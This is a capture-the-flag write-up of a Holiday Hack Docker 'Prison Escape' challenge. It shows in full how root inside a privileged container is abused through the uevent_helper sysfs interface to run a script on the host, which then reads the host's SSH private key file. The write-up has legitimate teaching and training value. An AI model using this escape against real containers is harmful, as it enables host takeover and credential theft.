# Prison Escape

Time to escape the Docker Prison. This was a neato exercise, since prior to this the extent of my Docker escapes usually revolved around poor developers that didn't think Docker containers were as ephemeral as they are supposed to be considered and left behind pretty sensitive artifacts that an attacker could use to pivot.

```
######################################################
Sun Dec 11 17:26:03 UTC 2022
On attempt [5] of trying to connect.
If no connection is made after [60] attempts
contact the holidayhack sys admins via discord.
######################################################
 
Greetings Noble Player, 

You find yourself in a jail with a recently captured Dwarven Elf.

He desperately asks your help in escaping for he is on a quest to aid a friend in a search for treasure inside a crypto-mine. 

If you can help him break free of his containment, he claims you would receive "MUCH GLORY!"

Please, do your best to un-contain yourself and find the keys to both of your freedom.
```

Greeted with a shell. A shell in which I had sudo access with no password:

```
grinchum-land:~$ sudo -l
User samways may run the following commands on grinchum-land:
    (ALL) NOPASSWD: ALL
grinchum-land:~$ sudo su
grinchum-land:/home/samways# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Ok, so now that I'm root...what should I do?

Let's try to break out of the container!

```
grinchum-land:/home/samways# cat /proc/1/cgroup
11:blkio:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
10:pids:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
9:perf_event:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
8:hugetlb:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
7:cpuset:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
6:devices:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
5:cpu,cpuacct:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
4:memory:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
3:freezer:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
2:net_cls,net_prio:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
1:name=systemd:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
0::/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
```

Confirmed we are in a docker container...

Checking `/dev` to see if we have access to a lot of devices. Apparently we do:

```
grinchum-land:/home/samways# ls /dev
autofs           loop0   nvram     tty1   tty20  tty31  tty42  tty53  tty7     vcs5   vcsu3
btrfs-control    loop1   ptmx      tty10  tty21  tty32  tty43  tty54  tty8     vcs6   vcsu4
core             loop2   ptp0      tty11  tty22  tty33  tty44  tty55  tty9     vcsa   vcsu5
cpu              loop3   pts       tty12  tty23  tty34  tty45  tty56  ttyS0    vcsa1  vcsu6
cpu_dma_latency  loop4   random    tty13  tty24  tty35  tty46  tty57  uhid     vcsa2  vda
cuse             loop5   shm       tty14  tty25  tty36  tty47  tty58  uinput   vcsa3  vsock
fd               loop6   snapshot  tty15  tty26  tty37  tty48  tty59  urandom  vcsa4  zero
full             loop7   stderr    tty16  tty27  tty38  tty49  tty6   vcs      vcsa5
fuse             mem     stdin     tty17  tty28  tty39  tty5   tty60  vcs1     vcsa6
input            mqueue  stdout    tty18  tty29  tty4   tty50  tty61  vcs2     vcsu
kmsg             net     tty       tty19  tty3   tty40  tty51  tty62  vcs3     vcsu1
loop-control     null    tty0      tty2   tty30  tty41  tty52  tty63  vcs4     vcsu2
```

Do we have access to disk devices?

```
grinchum-land:/home/samways# fdisk -l
Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
2048 cylinders, 64 heads, 32 sectors/track
Units: sectors of 1 * 512 = 512 bytes

Disk /dev/vda doesn't contain a valid partition table
```

Find the overlay filesystem path and set it to `$host_path`

```sh
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```


After some messing around, I discovered that the script on the page itself was relative to where the script was called from! To get this to work properly, I created the following script:

```sh
#!/bin/sh
b=`dirname $0`
cat /etc/hostname > $b/o.txt
```

I then added our script to the event helper and triggered a change:

```sh
echo "$host_path/t.sh" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
```


Now the output showed:
![Output](/img/elfhouse/prisonescape1.png)

Nice, showed the hostname of the host OS. I have code execution!

Now, since the challenge states :

```
Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file `/home/jailer/.ssh/jail.key.priv`?`
```

After changing the `cat /etc/hostname` to `cat /home/jailer/.ssh/jail.key.priv` and viewing the resulting `o.txt` file, I am greeted with this:

![Flag](/img/elfhouse/prisonescape2.png)

And just so I have the ascii:

```

                Congratulations! 

          You've found the secret for the 
          HHC22 container escape challenge!

                     .--._..--.
              ___   ( _'-_  -_.'
          _.-'   `-._|  - :- |
      _.-'           `--...__|
   .-'                       '--..___
  / `._                              \
   `. `._               one           |
     `. `._                           /
       '. `._    :__________....-----'
         `..`---'    |-_  _- |___...----..._
                     |_....--'             `.`.
               _...--'                       `.`.
          _..-'                             _.'.'
       .-'             step                _.'.'
       |                               _.'.'
       |                   __....------'-'
       |     __...------''' _|
       '--'''        |-  - _ |
               _.-''''''''''''''''''-._
            _.'                        |\
          .'                         _.' |
          `._          closer           |:.'
            `._                     _.' |
               `..__                 |  |
                    `---.._.--.    _|  |
                     | _   - | `-.._|_.'
          .--...__   |   -  _|
         .'_      `--.....__ |
        .'_                 `--..__
       .'_                         `.
      .'_    082bb339ec19de4935867   `-.
      `--..____                        _`.
               ```--...____          _..--'
                     | - _ ```---.._.'
                     |   - _ |
                     |_ -  - |
                     |   - _ |
                     | -_  -_|
                     |   - _ |
                     |   - _ |
                     | -_  -_|
```